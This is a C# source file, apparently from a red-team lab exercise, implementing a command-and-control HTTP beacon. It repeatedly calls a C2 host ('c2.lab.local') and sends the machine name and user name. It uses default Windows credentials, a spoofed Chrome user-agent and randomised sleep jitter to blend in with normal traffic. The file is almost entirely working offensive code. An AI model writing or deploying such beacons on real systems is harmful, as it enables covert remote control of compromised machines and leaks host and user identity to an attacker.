using System;
using System.Net;
using System.Threading;

namespace A05_1_http_beacon
{
    class Program
    {
        static void Main(string[] args)
        {
            string uri = "http://c2.lab.local/beacon";

            // Base sleep time in milliseconds
            int sleep = 20000;

            // Percentage of variance for sleep
            int jitter = 42;

            string user_agent =
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                "AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/89.0.4389.82 Safari/537.36";

            Random rand = new Random();

            // Calculate jitter offsets
            int lower = sleep - (sleep * jitter / 100);
            int upper = sleep + (sleep * jitter / 100);

            int maxBeacons = 10;

            for (int i = 0; i < maxBeacons; i++)
            {
                try
                {
                    WebClient client = new WebClient();

                    client.UseDefaultCredentials = true;

                    client.Headers.Add("user-agent", user_agent);

                    string beaconUrl =
                        uri +
                        "?id=A05_1" +
                        "&host=" + Environment.MachineName +
                        "&user=" + Environment.UserName +
                        "&seq=" + i +
                        "&time=" + DateTimeOffset.UtcNow.ToUnixTimeSeconds();

                    Console.WriteLine("[*] Sending beacon to: " + beaconUrl);

                    var content = client.DownloadString(beaconUrl);

                    Console.WriteLine(
                        "[+] Beacon successful. Response length: " +
                        content.Length);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(
                        "[-] Beacon failed: " + ex.Message);
                }

                int random = rand.Next(lower, upper);

                Console.WriteLine(
                    "[*] Sleeping for " +
                    (random * 0.001).ToString("F2") +
                    " seconds");

                Thread.Sleep(random);
            }

            Console.WriteLine("[*] Beacon loop complete.");
        }
    }
}